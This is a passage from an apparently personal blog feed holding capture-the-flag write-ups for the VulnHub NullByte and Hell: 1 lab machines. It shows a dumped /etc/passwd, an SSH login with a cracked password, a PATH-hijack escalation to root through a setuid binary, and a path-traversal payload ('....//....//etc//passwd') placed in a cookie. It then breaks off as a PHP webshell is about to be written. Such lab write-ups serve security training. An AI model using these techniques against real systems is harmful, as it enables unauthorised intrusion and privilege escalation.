<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/usr/sbin/nologin">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/a>
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span><span class='line'>systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span><span class='line'>systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span><span class='line'>systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span><span class='line'>messagebus:x:104:111::/var/run/dbus:/bin/false
</span><span class='line'>avahi:x:105:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
</span><span class='line'>Debian-exim:x:106:114::/var/spool/exim4:/bin/false
</span><span class='line'>statd:x:107:65534::/var/lib/nfs:/bin/false
</span><span class='line'>colord:x:108:117:colord colour management daemon,,,:/var/lib/colord:/bin/false
</span><span class='line'>sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>saned:x:110:119::/var/lib/saned:/bin/false
</span><span class='line'>hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
</span><span class='line'>bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
</span><span class='line'>eric:x:1001:1001:,,,:/home/eric:/bin/bash
</span><span class='line'>mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>ramses:x:1002:1002:,,,:/home/ramses:/bin/bash</span></code></pre></td></tr></table></div></figure></p>

<p>user <code>ramses</code> found in <code>/etc/passwd</code> file.</p>

<p>From previous findings, I know SSH is open on port 777, so try to SSH login with cracked password <code>ramses / omega</code> and bingo!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte/sqlmap_rst$ ssh &lt;a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#58;&#114;&#x61;&#x6d;&#115;&#x65;&#115;&#x40;&#x31;&#x30;&#46;&#49;&#46;&#49;&#46;&#49;&#x33;&#x34;">&#x72;&#97;&#109;&#115;&#101;&#x73;&#64;&#x31;&#48;&#x2e;&#x31;&#46;&#x31;&#46;&#x31;&#x33;&#x34;&lt;/a> -p 777
</span><span class='line'>&lt;a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#114;&#97;&#x6d;&#115;&#101;&#x73;&#64;&#x31;&#x30;&#46;&#x31;&#x2e;&#x31;&#46;&#49;&#x33;&#x34;">&#x72;&#97;&#x6d;&#x73;&#x65;&#115;&#x40;&#49;&#48;&#x2e;&#x31;&#46;&#49;&#x2e;&#49;&#51;&#52;&lt;/a>&rsquo;s password:&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
</span><span class='line'>ramses@NullByte:~$ id
</span><span class='line'>uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
</span><span class='line'>ramses@NullByte:~$ pwd
</span><span class='line'>/home/ramses
</span><span class='line'>ramses@NullByte:~$</span></code></pre></td></tr></table></div></figure></p>

<p>Now I am ramses!</p>

<h3>Privilege Escalation</h3>

<p>Looking around and found interesting program <code>procwatch</code> which has <code>setuid</code> set in the folder <code>/var/www/backup</code></p>

<p>By running the program and analysing the outcome, I can recognize that it calls system command <code>ps</code> in the program. However the program does not use full path of <code>ps</code>, so here is mis-configuration vulnerability which could be exploited by an attacker to make fake <code>ps</code> and set <code>$PATH</code> to get ROOT privilege.</p>

<p>Then I wrote a shell script and saved as &lsquo;ps&rsquo;, and grant executable permition for it.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat ps&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>!/bin/sh&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>/bin/sh&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>chmod +x ps&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Then change the environment variable <code>$PATH</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ramses@NullByte:/var/www/backup$ echo $PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
</span><span class='line'>ramses@NullByte:/var/www/backup$ echo $PATH
</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure></p>

<p>Then run the program <code>procwatch</code> to get ROOT:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ramses@NullByte:/var/www/backup$ ./procwatch
</span><span class='line'>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cd /root&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>ls -l&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>total 4
</span><span class='line'>-rw-r&ndash;r&ndash; 1 root root 1170 Aug  2 01:45 proof.txt</span></code></pre></td></tr></table></div></figure></p>

<p>Catch the flag <code>proof.txt</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat proof.txt&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>adf11c7a9e6523e630aaf3b9b7acb51d&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>It seems that you have pwned the box, congrats.
</span><span class='line'>Now you done that I wanna talk with you. Write a walk &amp; mail at
</span><span class='line'>&lt;a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#120;&#x6c;&#121;&#48;&#x6e;&#64;&#x73;&#x69;&#103;&#97;&#105;&#x6e;&#116;&#x2e;&#x6f;&#x72;&#103;">&#x78;&#x6c;&#x79;&#48;&#110;&#x40;&#115;&#x69;&#103;&#97;&#105;&#x6e;&#116;&#x2e;&#x6f;&#114;&#x67;&lt;/a> attach the walk and proof.txt
</span><span class='line'>If sigaint.org is down you may mail at &lt;a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#x6e;&#98;&#x73;&#108;&#121;&#48;&#x6e;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#x6e;&#x62;&#115;&#108;&#121;&#48;&#x6e;&#x40;&#x67;&#x6d;&#x61;&#105;&#108;&#46;&#x63;&#x6f;&#109;&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>USE THIS PGP PUBLIC KEY&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&mdash;&ndash;BEGIN PGP PUBLIC KEY BLOCK&mdash;&ndash;
</span><span class='line'>Version: BCPG C# v1.6.1.0&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
</span><span class='line'>Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
</span><span class='line'>e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
</span><span class='line'>Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
</span><span class='line'>+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
</span><span class='line'>YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
</span><span class='line'>Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
</span><span class='line'>HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
</span><span class='line'>m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
</span><span class='line'>XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
</span><span class='line'>kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
</span><span class='line'>TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
</span><span class='line'>Gms=
</span><span class='line'>=PiAQ
</span><span class='line'>&mdash;&ndash;END PGP PUBLIC KEY BLOCK&mdash;&ndash;</span></code></pre></td></tr></table></div></figure></p>

<p>Done and cheers Ly0n!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Hell: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/07/17/vulnhub-hell-1/"/>
    <updated>2015-07-17T00:01:30-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/07/17/vulnhub-hell-1</id>
    <content type="html"><![CDATA[<p>&ldquo;This VM is designed to try and entertain the more advanced information security enthusiast. This doesn&rsquo;t exclude beginners however and I&rsquo;m sure that a few of you could meet the challenge. There is no &lsquo;one&rsquo; focus on the machine, a range of skills such as web exploitation, password cracking, exploit development, binary examination and most of all logical thinking is required to crack the box in the intended way - but who knows there might be some short cuts!</p>

<p>A few of the skills needed can be seen in some posts on <a href="http://netsec.ws.">http://netsec.ws.</a> Otherwise enjoy the experience - remember that although vulnerabilities might not jump out at you straight away you may need to try some variations on the normal to get past the protections in place!&ldquo; &ndash; <font color="green">Peleus</font> (<a href="http://netsec.ws/">http://netsec.ws/</a>)</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/hell-1,95/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Hell (<em>10.10.10.146/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Local File Include vulnerability existed in one of cookie variable</li>
<li>File upload function without any content filter will save any evil code into pre-defined file &lsquo;note.txt&rsquo; under folder &lsquo;/tmp/&rsquo;</li>
<li>Sensitive information found in &lsquo;login.php&rsquo; which disclose jack&rsquo;s SSH password and Database password</li>
<li>Use jack&rsquo;s PGP private key file to unlock the encrypted email file and found SSH password for another account &lsquo;milk_4_life&rsquo;</li>
<li>&lsquo;game&rsquo; program has sticky bit set and will call another program &lsquo;chmod&rsquo; when user win the game, but it has not been using absolute path for &lsquo;chmod&rsquo;</li>
<li>&lsquo;Rockyou&rsquo; dictionary based brute force attacking and cracked the password for &lsquo;Truecrypt&rsquo; container file found in george&rsquo;s home folder, found SSH private key file for another account &lsquo;bazza&rsquo;</li>
<li>Very similar vulnerability as in &lsquo;game&rsquo; happened in another program &lsquo;part2&rsquo; which can be expolited to privilege escape to &lsquo;oj&rsquo;</li>
<li>&lsquo;echo&rsquo; program has Format String vulnerability which should be able to be exploited to get ROOT</li>
<li>&lsquo;Truecrypt&rsquo; has vulnerability which can make attacker to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>, <font color="FF8000">burp proxy</font>]</li>
<li>brute fuzz to find hidden files and paths [<font color="FF8000">wfuzz</font>]</li>
<li>Local file including vulnerability detect and exploit [<font color="FF8000">curl</font>]</li>
<li>Truecrypt password brute force attacking [<font color="FF8000">truecrack</font>]</li>
<li>Analysis and write script to win &lsquo;game&rsquo; program [<font color="FF8000">python</font>]</li>
<li>Poked around in the file system and found sensitive information</li>
<li>Hijack executable program to get privilege escalation</li>
<li>Make evil truecrypt file to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="http://www.edge-security.com/wfuzz.php">wfuzz</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burpsuite</a></li>
<li><a href="http://curl.haxx.se/">curl</a></li>
<li><a href="https://code.google.com/p/truecrack/">truecrack</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>netdiscover</code> as routine to detect the target&rsquo;s IP address (10.10.10.146 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netdiscover -r 10.10.10.0/24&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p> Currently scanning: Finished!   |   Screen View: Unique Hosts&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;h2>   IP            At MAC Address      Count  Len   MAC Vendor                   &lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p> 10.10.10.1      00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                             &lt;br/>
</span><span class='line'> 10.10.10.2      00:50:56:e2:f9:10    01    060   VMWare, Inc.                                                                                             &lt;br/>
</span><span class='line'> 10.10.10.146    00:0c:29:e2:78:6f    01    060   VMware, Inc.                                                                                             &lt;br/>
</span><span class='line'> 10.10.10.254    00:50:56:fb:67:d4    01    060   VMWare, Inc. &lt;br/></span></code></pre></td></tr></table></div></figure></p>

<p>10.10.10.146 is our Target!</p>

<p>Next, run <code>nmap</code> to scan open services on the target.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV -O -A -p- -T5 10.10.10.146&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-07-13 08:24 EDT
</span><span class='line'>Nmap scan report for 10-10-10-146.tpgi.com.au (10.10.10.146)
</span><span class='line'>Host is up (0.00044s latency).
</span><span class='line'>Not shown: 65529 closed ports
</span><span class='line'>PORT      STATE    SERVICE VERSION
</span><span class='line'>22/tcp    open     ssh     OpenSSH 6.0p1 Debian 4+deb7u1 (protocol 2.0)
</span><span class='line'>| ssh-hostkey:
</span><span class='line'>|   1024 f4:bb:f4:22:36:08:61:ef:74:2c:27:e0:b4:a2:69:d3 (DSA)
</span><span class='line'>|   2048 0e:31:1d:cf:04:d0:63:fa:5c:76:f2:dc:22:1c:f1:7c (RSA)
</span><span class='line'>|&lt;em>  256 e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa (ECDSA)
</span><span class='line'>80/tcp    open     http    Apache httpd 2.2.22 ((Debian))
</span><span class='line'>|&lt;/em>http-methods: GET HEAD POST OPTIONS
</span><span class='line'>| http-robots.txt: 2 disallowed entries
</span><span class='line'>|&lt;em>/personal/ /super_secret_login_path_muhahaha/
</span><span class='line'>|&lt;/em>http-title: Have fun!
</span><span class='line'>111/tcp   open     rpcbind 2-4 (RPC #100000)
</span><span class='line'>| rpcinfo:
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          44490/tcp  status
</span><span class='line'>|_  100024  1          52715/udp  status
</span><span class='line'>666/tcp   open     doom?
</span><span class='line'>1337/tcp  filtered waste
</span><span class='line'>44490/tcp open     status  1 (RPC #100024)
</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>

<p>ports 22 and 80 open, and two very interesting folders found on port 80: <code>\personal</code> and <code>\super_secret_login_path_muhahaha\</code>. Then using <code>wfuzz</code> to reveal more possible hidden folders and files:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# wfuzz -c &ndash;hc 404 -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt &lt;a href="http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php">http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Wfuzz  2.0 - The Web Bruteforcer                     *&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p>Target: &lt;a href="http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php">http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php&lt;/a>
</span><span class='line'>Payload type: file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Total requests: 81643&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>ID  Response   Lines      Word         Chars          Request    &lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>00001:  C=200     17 L        33 W      371 Ch    &ldquo; - #&rdquo;
</span><span class='line'>00002:  C=200     17 L        33 W      371 Ch    &ldquo; - # directory-list-lowercase-2.3-small.txt&rdquo;
</span><span class='line'>00003:  C=200     17 L        33 W      371 Ch    &ldquo; - # Copyright 2007 James Fisher&rdquo;
</span><span class='line'>00004:  C=200     17 L        33 W      371 Ch    &ldquo;on-Share Alike 3.0 License. To view a copy of this&rdquo;
</span><span class='line'>00005:  C=200     17 L        33 W      371 Ch    &ldquo;# This work is licensed under the Creative Commons&rdquo;
</span><span class='line'>00006:  C=200     17 L        33 W      371 Ch    &ldquo;sit &lt;a href="http://creativecommons.org/licenses/by-sa/3.0/">http://creativecommons.org/licenses/by-sa/3.0/&lt;/a>&rdquo;
</span><span class='line'>00007:  C=200     17 L        33 W      371 Ch    &ldquo; - #&rdquo;
</span><span class='line'>00008:  C=200     17 L        33 W      371 Ch    &ldquo; - #&rdquo;
</span><span class='line'>00009:  C=200     17 L        33 W      371 Ch    &ldquo; Suite 300, San Francisco, California, 94105, USA.&rdquo;
</span><span class='line'>00010:  C=200     17 L        33 W      371 Ch    &ldquo;ed case insensative list, where entries were found&rdquo;
</span><span class='line'>00011:  C=200     17 L        33 W      371 Ch    &ldquo; - # on atleast 3 different hosts&rdquo;
</span><span class='line'>00012:  C=200     17 L        33 W      371 Ch    &ldquo;d a letter to Creative Commons, 171 Second Street,&rdquo;
</span><span class='line'>00016:  C=403     10 L        30 W      317 Ch    &ldquo; - &rdquo;
</span><span class='line'>00017:  C=200     17 L        33 W      371 Ch    &ldquo; - index&rdquo;
</span><span class='line'>00028:  C=200     17 L        33 W      371 Ch    &ldquo; - #&rdquo;
</span><span class='line'>00063:  C=302      0 L         0 W        0 Ch    &ldquo; - login&rdquo;
</span><span class='line'>00193:  C=200      5 L        19 W      163 Ch    &ldquo; - mail&rdquo;
</span><span class='line'>00198:  C=200      2 L         2 W       19 Ch    &ldquo; - users&rdquo;
</span><span class='line'>00470:  C=302     17 L        35 W      387 Ch    &ldquo; - personal&rdquo;
</span><span class='line'>00572:  C=200      7 L        21 W      170 Ch    &ldquo; - server&rdquo;
</span><span class='line'>01051:  C=200      5 L        20 W      179 Ch    &ldquo; - notes&rdquo;
</span><span class='line'>01255:  C=302      1 L         0 W        2 Ch    &ldquo; - check&rdquo;
</span><span class='line'>05186:  C=302     21 L        38 W      566 Ch    &ldquo; - panel&rdquo;
</span><span class='line'>Stopping&hellip;</span></code></pre></td></tr></table></div></figure></p>

<p>After I checked those revealed files, I found three interesting ones: <code>1.php</code>, <code>check.php</code> and <code>notes.php</code>.</p>

<p>Having a look at <code>1.php</code>, there is only one sentence: <font color="red">INTRUDER ALERT!</font> which is in Red color and all Capital.</p>

<p>By playing <code>check.php</code> with Burp proxy, I noticed that if user input wrong username/password, the cookie variable <code>failcount</code> will increase. However when input the wrong username/password more than 3 times, a new cookie <code>intruder</code> will be added and the value is always 1.</p>

<p>Also the <code>check.php</code> will request <code>personal.php</code> and <code>panel.php</code> as well, something noticeable in <code>panel.php</code> is that the red color alert: <font color="red">INTRUDER ALERT!</font> which is same as the content of <code>1.php</code>.</p>

<p>So based on the above facts and analysis, I could guess that the <code>panel.php</code> has included the <code>1.php</code> when user input wrong username/password over 3 times. As a result, I firstly modified the cookie value of <code>intruder</code> to <code>../../../../etc/passwd</code> but the respond is not excepted&hellip; might be the admin set a filter here or something like that. After I read the page in OWASP testing <a href="https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)">guide</a>, I finally found a well-working payload: <code>....//....//....//....//....//....//etc//passwd</code>.</p>

<p><img class="left" src="/downloads/Hell1/1.png"></p>

<p>Here is a Local File Include vulnerability found.</p>

<p>Now it&rsquo;s time to move to <code>notes.php</code>.</p>

<p>Taking a close look at notes.php, I noticed that we can write anything and it will be saved in temporary folder(mostly possible is /tmp/ in Linux) as the name is <code>note.txt</code>.</p>

<p><img class="left" src="/downloads/Hell1/2.png"></p>

<p>After some trying, it is proved that the <code>note.txt</code> file is saved in <code>/tmp/</code> folder.</p>

<p>Then I wrote one-line PHP webshell to note.txt, then use File Include vulnerability found previously to include the webshell.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
